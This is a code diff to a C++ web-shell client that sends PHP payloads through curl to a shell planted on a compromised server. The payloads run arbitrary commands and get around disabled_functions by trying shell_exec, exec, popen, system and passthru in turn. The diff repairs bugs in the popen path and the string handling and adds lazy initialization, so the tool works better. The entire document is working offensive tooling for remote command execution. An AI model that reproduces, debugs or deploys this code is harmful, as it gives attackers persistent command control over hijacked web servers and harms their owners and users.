@@ -20,6 +20,13 @@ WebShell::WebShell(string addr, METHOD meth, string password, PLACE paramplace,s
 }
 void WebShell::initialize(){
 	this->get_disabled_functions();
+	/*	
+	for(vector<string>::iterator it=this->disabled_functions.begin();it!=this->disabled_functions.end();it++){
+		cout<<*it<<endl;
+	}
+	
+	if(find(this->disabled_functions.begin(),this->disabled_functions.end(),"shell_exec")==this->disabled_functions.end()){cout<<"int"<<endl;}
+	*/
 }
 void WebShell::addClientMethod(ENCRYPT_METHOD meth, string param) {
 	this->EncryptMethod.push_back(make_pair(meth, param));
@@ -209,8 +216,12 @@ string WebShell::get_kernel_version() {
 	return res;
 }
 CURLcode WebShell::ShellCommandExec(string command,string& ans) {
+	if(!this->initialized){
+		this->initialized=true;
+		this->initialize();
+	}
 	string phpsentence = "";
-	if (find(disabled_functions.begin(), disabled_functions.end(), "shell_exec") == disabled_functions.end())
+	if (find(disabled_functions.begin(), disabled_functions.end(), "shell_exec") ==disabled_functions.end())
 		phpsentence = "$a='" + command + "';"
 		"if(isset($_COOKIE['dir']))$dir=$_COOKIE['dir'];"
 		"else$dir=dirname(__FILE__);"
@@ -223,7 +234,7 @@ CURLcode WebShell::ShellCommandExec(string command,string& ans) {
 		"{if(substr($ans[1],0,1)=='/')$dir=$ans[1];"
 		"else $dir.='/'.$ans[1];}}}"
 		"echo base64_encode(shell_exec($a));"
-		"setcookie('dir',$dir);";
+		"setcookie('dir',$dir);//";
 	else if (find(disabled_functions.begin(), disabled_functions.end(), "exec") == disabled_functions.end())
 		phpsentence = "$a='" + command + "';"
 		"if(isset($_COOKIE['dir']))$dir=$_COOKIE['dir'];"
@@ -239,13 +250,13 @@ CURLcode WebShell::ShellCommandExec(string command,string& ans) {
 		"$result=array();"
 		"exec($a,$result);"
 		"$answer='';"
-		"foreach($result as $per){$answer.=$per.'\r\n';}"
+		"foreach($result as $per){$answer.=$per.\"\\r\\n\";}"
 		"echo base64_encode($answer);"
-		"setcookie('dir',$dir);";
-	else if (find(disabled_functions.begin(), disabled_functions.end(), "poen") == disabled_functions.end())
+		"setcookie('dir',$dir);//";
+	else if (find(disabled_functions.begin(), disabled_functions.end(), "popen") == disabled_functions.end())
 		phpsentence = "$a='" + command + "';"
 		"if(isset($_COOKIE['dir']))$dir=$_COOKIE['dir'];"
-		"else$dir=dirname(__FILE__);"
+		"else{$dir=dirname(__FILE__);}"
 		"chdir($dir);$a=$a.';';"
 		"$commands=explode(';',$a);"
 		"foreach($commands as $command){"
@@ -254,15 +265,14 @@ CURLcode WebShell::ShellCommandExec(string command,string& ans) {
 		"{if(is_dir($ans[1]))"
 		"{if(substr($ans[1],0,1)=='/')$dir=$ans[1];"
 		"else $dir.='/'.$ans[1];}}}"
-		"    $fp = popen($command,'');"
-		"$ans="";"
+		"    $fp = popen($a,'r');"
+		"$ans=\"\";"
 		"while (!feof($fp))"
 		"{"
-		"$ans=$ans+fread($fp, 1024);"
-		"flush();"
+		"$ans=$ans.fread($fp, 1024);"
 		"} "
 		"echo base64_encode($ans);"
-		"setcookie('dir',$dir);";
+		"setcookie('dir',$dir);//";
 	else if (find(disabled_functions.begin(), disabled_functions.end(), "system") == disabled_functions.end())
 		phpsentence = "$a='" + command + "';"
 		"if(isset($_COOKIE['dir']))$dir=$_COOKIE['dir'];"
@@ -276,7 +286,7 @@ CURLcode WebShell::ShellCommandExec(string command,string& ans) {
 		"{if(substr($ans[1],0,1)=='/')$dir=$ans[1];"
 		"else $dir.='/'.$ans[1];}}}"
 		"system($a);"
-		"setcookie('dir',$dir);";
+		"setcookie('dir',$dir);//";
 	else if (find(disabled_functions.begin(), disabled_functions.end(), "passthru") == disabled_functions.end())
 		phpsentence = "$a='" + command + "';"
 		"if(isset($_COOKIE['dir']))$dir=$_COOKIE['dir'];"
@@ -290,7 +300,7 @@ CURLcode WebShell::ShellCommandExec(string command,string& ans) {
 		"{if(substr($ans[1],0,1)=='/')$dir=$ans[1];"
 		"else $dir.='/'.$ans[1];}}}"
 		"passthru($a);"
-		"setcookie('dir',$dir);";
+		"setcookie('dir',$dir);//";
 	else return CURLE_COULDNT_CONNECT;
 	CURLcode res=php_exec(phpsentence, ans);
 	if (res != CURLE_OK&& res != CURLE_HTTP_NOT_FOUND)ans = curl_easy_strerror(res);
